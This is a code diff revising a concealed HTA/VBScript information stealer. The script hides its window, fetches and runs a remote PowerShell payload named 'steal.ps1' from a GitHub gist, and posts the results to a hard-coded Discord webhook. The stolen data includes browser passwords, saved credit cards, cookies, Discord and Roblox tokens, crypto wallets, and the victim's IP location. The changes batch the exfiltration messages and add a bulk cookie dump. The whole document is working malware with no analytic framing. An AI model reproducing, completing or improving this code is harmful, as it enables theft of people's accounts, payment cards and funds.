@@ -6,100 +6,39 @@ window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
 Dim sh, fso, WH, PC, USER
-Set sh = CreateObject("WScript.Shell")
+Set sh  = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- WEBHOOK ---
-WH = "https://discord.com/api/webhooks/1375311447839608973/ILdJfm-Tu7IbvMPLxRZhhQk6esgMVMhRj8dxUXpbJwEy4F6XQhf-zfkRXrI3UC8xA7-T"
-
-PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+WH   = "https://discord.com/api/webhooks/1375311447839608973/ILdJfm-Tu7IbvMPLxRZhhQk6esgMVMhRj8dxUXpbJwEy4F6XQhf-zfkRXrI3UC8xA7-T"
+PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- Initial Grab ---
+Dim BUF: BUF = ""
+Dim BUFC: BUFC = 0
+
 Call GrabTokens
+Flush
 Call IP
-Call GrabRoblox
 
 window.close()
 
-' --- IP Function ---
-Sub IP()
-    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
-    xh.Open "GET", "https://api.ipify.org/", False
-    xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim ip : ip = xh.responseText
-    If Len(ip) < 7 Then Exit Sub
-    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
-    xh.Send
-    If xh.Status <> 200 Then Exit Sub
-    Dim ll : ll = Split(xh.responseText, vbLf)
-    Dim info : info = "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER
-    Call PostEmbed(":dart: Target", info, 3447003)
-    Set xh = Nothing
-End Sub
-
-' --- GrabRoblox Function ---
-Sub GrabRoblox()
-    Dim paths(2)
-    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
-    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
-    paths(2) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
-
-    Dim i, fp, raw
-    For i = 0 To 2
-        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
-    Next
-    If Len(fp) = 0 Then Exit Sub
-    raw = ReadFile(fp)
-    If Len(raw) < 50 Then Exit Sub
-
-    Dim cookie: cookie = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
-    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
-        Dim sp: sp = InStr(raw, "CookiesData"":""")
-        If sp > 0 Then
-            sp = sp + 14
-            Dim ep: ep = InStr(sp, raw, """")
-            If ep > sp Then
-                Dim b64: b64 = Mid(raw, sp, ep - sp)
-                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
-            End If
-        End If
-    End If
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
-        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
-    End If
-    If Len(cookie) = 0 Then cookie = raw
-
-    cookie = Replace(cookie, vbCr, "")
-    cookie = Replace(cookie, vbLf, "")
-    cookie = Replace(cookie, vbTab, "")
-    cookie = Trim(cookie)
-    Dim sc: sc = InStr(cookie, ";")
-    If sc > 0 Then cookie = Left(cookie, sc - 1)
-    cookie = Trim(cookie)
-    Dim warn: warn = InStr(cookie, "_|WARNING")
-    If warn > 1 Then cookie = Mid(cookie, warn)
-
-    PostEmbed "Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC, 65280
-    PostFile "cookie.txt", cookie
-End Sub
-
-' --- GrabTokens ---
+' ============================================================
 Sub GrabTokens()
+    Dim url: url = "https://gist.githubusercontent.com/Lxg-cmd/db66e446becfc797f0f82ced9cea78fb/raw/3b6546cc1f489afa79f41740a62b4edc5a3b9aad/steal.ps1"
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
-    xh.Open "GET", "https://gist.githubusercontent.com/Lxg-cmd/5df7ed7f356aaf41adc78298855755bc/raw/1c91dd604cfe83c836340d379a3219d7101ea973/steal.ps1", False
+    xh.Open "GET", url, False
     xh.Send
     If xh.Status <> 200 Then
-        Call PostEmbed(":x: PS download failed", "HTTP " & xh.Status, 16711680)
+        Call AddEmbed(":x: PS download failed", "HTTP " & xh.Status, 16711680)
         Exit Sub
     End If
     Dim pc: pc = xh.responseText
-    If Len(pc) < 100 Then Exit Sub
     Set xh = Nothing
+    If Len(pc) < 100 Then
+        Call AddEmbed(":x: PS empty", "gist returned " & Len(pc) & " bytes", 16711680)
+        Exit Sub
+    End If
 
     Dim psf: psf = TmpFile("steal.ps1")
     WriteFile psf, pc
@@ -108,87 +47,145 @@ Sub GrabTokens()
 
     Dim tf: tf = TmpFile("steal_result.txt")
     If Not fso.FileExists(tf) Then
-        Call PostEmbed(":x: no result file", "PS wrote nothing to " & tf, 16711680)
+        Call AddEmbed(":x: no result file", "PS wrote nothing to " & tf, 16711680)
         Exit Sub
     End If
     Dim raw: raw = ReadFile(tf)
     If Len(raw) < 5 Then
-        Call PostEmbed(":x: empty result", "file exists but empty", 16711680)
+        Call AddEmbed(":x: empty result", "file exists, zero bytes", 16711680)
         Exit Sub
     End If
 
-    Dim US: US = Chr(31)
     Dim lines: lines = Split(raw, vbCrLf)
-    Dim first: first = Split(lines(0), US)
-    If first(0) <> "VER" Then
-        Call PostEmbed(":warning: VERSION MISMATCH", "First line tag = [" & first(0) & "]" & vbCrLf & "Expected VER " & Chr(34) & "3" & Chr(34) & vbCrLf & "Gist is serving the old script — update it.", 16711680)
+    Dim first: first = Split(lines(0), Chr(31))
+    If first(0) <> "VER" Or first(1) <> "4" Then
+        Call AddEmbed(":warning: VERSION MISMATCH", "got [" & first(0) & " " & first(1) & "], expected VER 4" & vbCrLf & "gist is serving an old script", 16711680)
     End If
 
+    ParseLines lines
+    fso.DeleteFile tf, True
+End Sub
+
+' ============================================================
+Sub ParseLines(lines)
+    Dim US: US = Chr(31)
     Dim l, f, tag
+    Dim cookieDump: cookieDump = ""
+
     For Each l In lines
         If Len(l) > 4 Then
-            f = Split(l, US)
+            f   = Split(l, US)
             tag = f(0)
-            If tag = "VER" Then Call PostEmbed(":white_check_mark: PS version", f(1), 3447003)
-            If tag = "DBG" Then Call PostEmbed(":bug: " & f(1), f(2), 9807270)
+
+            If tag = "VER" And UBound(f) >= 1 Then
+                Call AddEmbed(":white_check_mark: PS version", f(1), 3447003)
+            End If
+
+            If tag = "DBG" And UBound(f) >= 2 Then
+                Call AddEmbed(":bug: " & f(1), Left(f(2), 1000), 9807270)
+            End If
+
             If tag = "STAT" And UBound(f) >= 5 Then
-                Call PostEmbed(":bar_chart: Summary", f(1) & " | " & f(2) & " | " & f(3) & " | " & f(4) & " | " & f(5) & vbCrLf & "PC: " & PC & " | " & USER, 3447003)
+                Call AddEmbed(":bar_chart: Summary", f(1) & " | " & f(2) & " | " & f(3) & " | " & f(4) & " | " & f(5) & vbCrLf & "PC: " & PC & " | " & USER, 3447003)
             End If
+
             If tag = "LOGIN" And UBound(f) >= 5 Then
-                Call PostEmbed(":globe_with_meridians: " & f(1) & " login", "Profile: " & f(2) & vbCrLf & "URL: " & f(3) & vbCrLf & "User: " & f(4) & vbCrLf & "Pass: " & f(5), 5793266)
+                Dim d: d = "Profile: " & f(2) & vbCrLf & "URL: " & f(3) & vbCrLf & "User: " & f(4) & vbCrLf & "Pass: " & f(5)
+                Call AddEmbed(":globe_with_meridians: " & f(1) & " login", Left(d, 3900), 5793266)
             End If
+
             If tag = "CARD" And UBound(f) >= 4 Then
-                Call PostEmbed(":credit_card: " & f(1) & " card", "Name: " & f(2) & vbCrLf & "Exp: " & f(3) & vbCrLf & "Number: " & f(4), 16776960)
+                Call AddEmbed(":credit_card: " & f(1) & " card", "Name: " & f(2) & vbCrLf & "Exp: " & f(3) & vbCrLf & "Number: " & f(4), 16776960)
             End If
+
             If tag = "COOKIE" And UBound(f) >= 4 Then
-                Call PostEmbed(":cookie: Cookie — " & f(1) & " / " & f(2), f(3) & " = " & Left(f(4), 200), 65280)
+                cookieDump = cookieDump & f(1) & vbTab & f(2) & vbTab & f(3) & vbTab & f(4) & vbCrLf
             End If
+
             If tag = "DISCORD" And UBound(f) >= 5 Then
                 Dim di: di = "**User:** " & f(1) & vbCrLf
                 If f(2) <> "" Then di = di & "**Email:** " & f(2) & vbCrLf
                 If f(3) <> "" Then di = di & "**Phone:** " & f(3) & vbCrLf
-                If f(4) <> "0" Then di = di & "**ID:** " & f(4) & vbCrLf
+                If f(4) <> "0" And f(4) <> "" Then di = di & "**ID:** " & f(4) & vbCrLf
                 di = di & "**Token:** " & f(5) & vbCrLf & "**PC:** " & PC
-                Call PostEmbed(":gift: Discord Token", di, 5793266)
+                Call AddEmbed(":gift: Discord Token", Left(di, 3900), 5793266)
             End If
+
             If (tag = "ROBLOX" Or tag = "ROBLOXMS") And UBound(f) >= 1 Then
-                Call PostEmbed(":cookie: " & tag, "Size: " & Len(f(1)) & " | PC: " & PC, 65280)
+                Call AddEmbed(":cookie: " & tag, "Size: " & Len(f(1)) & " | PC: " & PC, 65280)
                 Call PostFile(tag & "_cookie.txt", f(1))
             End If
+
             If tag = "PASSWORD" And UBound(f) >= 4 Then
-                Call PostEmbed(":key: Password DB", f(1) & " | " & f(2) & " | " & f(3) & " | " & Len(f(4)) & " b64 chars", 16776960)
+                Call AddEmbed(":key: Password DB", f(1) & " | " & f(2) & " | " & f(3) & " | " & Len(f(4)) & " b64 chars", 16776960)
                 If f(2) = "RAW_DB" And Len(f(4)) > 0 Then Call PostFile(f(1) & "_" & f(3) & ".db.b64", f(4))
             End If
+
+            If tag = "CREDS" And UBound(f) >= 2 Then
+                Call AddEmbed(":page_facing_up: Credential file", f(1) & " — " & f(2), 3447003)
+            End If
+
             If tag = "WALLET" And UBound(f) >= 3 Then
-                Call PostEmbed(":briefcase: Wallet", f(1) & " — " & f(2) & " — " & f(3), 65280)
+                Call AddEmbed(":briefcase: Wallet", f(1) & " — " & f(2) & " — " & f(3), 65280)
             End If
         End If
     Next
-    fso.DeleteFile tf, True
+
+    If Len(cookieDump) > 0 Then
+        Call AddEmbed(":cookie: Cookies", "dump attached — " & Len(cookieDump) & " bytes", 65280)
+        Call PostFile("cookies_" & PC & ".txt", cookieDump)
+    End If
 End Sub
 
-' --- Utility Functions ---
-Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
-Sub WriteFile(path, content): Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
-Function ReadFile(path): ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
+' ============================================================
+Sub IP()
+    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    xh.SetOption 2, 13056
+    xh.Open "GET", "https://api.ipify.org/", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim ip: ip = xh.responseText
+    If Len(ip) < 7 Then Exit Sub
+    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
+    xh.Send
+    If xh.Status <> 200 Then Exit Sub
+    Dim ll: ll = Split(xh.responseText, vbLf)
+    Call AddEmbed(":dart: Target", "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER, 3447003)
+    Set xh = Nothing
+End Sub
 
-' --- PostEmbed (direct to discord) ---
-Sub PostEmbed(t, d, c)
+' ============================================================
+Sub AddEmbed(t, d, c)
     Dim DQ: DQ = Chr(34)
-    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
+    Dim e: e = "{" & DQ & "title" & DQ & ":" & DQ & Ej(Left(t, 250)) & DQ & "," & _
+                   DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & _
+                   DQ & "color" & DQ & ":" & c & "}"
+    If Len(BUF) > 0 Then BUF = BUF & ","
+    BUF = BUF & e
+    BUFC = BUFC + 1
+    If BUFC >= 10 Then Call Flush
+End Sub
+
+Sub Flush()
+    If BUFC = 0 Then Exit Sub
+    Dim DQ: DQ = Chr(34)
+    Dim j: j = "{" & DQ & "embeds" & DQ & ":[" & BUF & "]}"
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", WH, False
     h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
     Set h = Nothing
+    BUF  = ""
+    BUFC = 0
 End Sub
 
-' --- PostFile (direct to discord) ---
 Sub PostFile(fn, ct)
     Dim DQ: DQ = Chr(34)
     Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
-    Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
+    Dim bd: bd = "--" & b & vbCrLf & _
+                 "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & _
+                 vbCrLf & ct & vbCrLf & "--" & b & "--"
     Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     h.SetOption 2, 13056
     h.Open "POST", WH, False
@@ -197,24 +194,30 @@ Sub PostFile(fn, ct)
     Set h = Nothing
 End Sub
 
-' --- DecryptDPAPI ---
-Function DecryptDPAPI(b64)
-    DecryptDPAPI = ""
-    Dim inf: inf = TmpFile("dpi.txt")
-    Dim outf: outf = TmpFile("dpo.txt")
-    fso.DeleteFile outf, True
-    WriteFile inf, b64
-    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
-    Dim psf: psf = TmpFile("dpapi.ps1")
-    WriteFile psf, ps
-    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
-    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
-    fso.DeleteFile inf, True
-    fso.DeleteFile psf, True
-    fso.DeleteFile outf, True
+' ============================================================
+Function TmpFile(name)
+    TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name
 End Function
 
-' --- Ej ---
+Sub WriteFile(path, content)
+    Dim f: Set f = fso.CreateTextFile(path, True, True)
+    f.Write content
+    f.Close
+    Set f = Nothing
+End Sub
+
+Function ReadFile(path)
+    ReadFile = ""
+    Dim s: Set s = CreateObject("ADODB.Stream")
+    s.Type = 2
+    s.Charset = "utf-8"
+    s.Open
+    s.LoadFromFile path
+    ReadFile = s.ReadText(-1)
+    s.Close
+    Set s = Nothing
+End Function
+
 Function Ej(s)
     Ej = s
     Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
